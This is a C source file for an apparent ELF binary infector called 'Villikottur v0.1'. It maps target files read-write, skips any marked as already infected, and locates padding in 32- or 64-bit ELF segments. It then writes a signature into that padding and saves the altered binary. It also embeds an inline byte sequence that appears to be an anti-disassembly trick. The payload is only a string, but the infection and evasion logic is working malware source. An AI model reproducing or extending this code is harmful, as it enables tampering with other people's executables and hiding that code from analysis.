#include "vil.h"

static int			error(char *whut)
{
	if (visual)
		dprintf(2, "%s", whut);
	return (1);
}

int			write_string(char *ptr, off_t size, char *filename, int fd)
{
	__asm__(".byte 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xeb, 0x08, 0xff, 0xff, 0x48, 0x31, 0xc0, 0xeb, 0xf7, 0xe8");
	if (visual)
		fprintf(stdout, BOLDBLUE"-x-x-x-x- "RED"\\_<O>_<O>_/ "BLUE"-x-x-x-x-\n"RED"-> "CYAN"%s\n\n"RESET, filename);
	message = "Villikottur v0.1 <pharatyk>";
	if (check_copy(ptr, size))
	{
		if (visual)
		{
			fprintf(stderr, BOLDRED"<"CYAN"o"RED">"RESET CYAN"%s"YELLOW" already infected\n", filename);
			fprintf(stdout, BOLDBLUE"-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-\n\n"RESET);
		}
		return (0);
	}
	int ret = is_32or64ELF(ptr);
	if (!ret)
		return (0);
	off_t	endSegment;
	if (ret == 2)
		endSegment = PaddingFinder_shdr_64(ptr);
	else if (ret == 1)
		endSegment = PaddingFinder_shdr_32(ptr);
	if (visual)
		fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" stuff in ["RED"%x"YELLOW"]\n"RESET, endSegment);
	if (endSegment)
	{
		memmove(ptr + endSegment, message, strlen(message));
		write(fd, ptr, size);
	}
	if (visual)
	{
		fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" success \\o/  :  "CYAN"%s\n"RESET, filename);
		fprintf(stdout, BOLDBLUE"-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-\n\n"RESET);
	}

	return (0);
}

int			file_checker(char *filename)
{
	int			fd;
	char		*ptr;
	struct stat	buf;

	if ((fd = open(filename, O_RDWR)) < 0)
		return (error("open failed\n"));
	if (fstat(fd, &buf) < 0)
		return (error("fstat failed\n"));
	if (S_ISDIR(buf.st_mode))
	{
		ft_printfd(2, "%s is a directory\n", filename);
		return (1);
	}
	if ((ptr = mmap(0, buf.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0))
		== MAP_FAILED)
		return (error("mmap failed\n"));
	if (write_string(ptr, buf.st_size, filename, fd))
		return (1);
	if (munmap(ptr, buf.st_size) < 0)
		return (error("munmap failed\n"));
	if (close(fd) < 0)
		return (error("failes to close fd\n"));
	return (0);
}
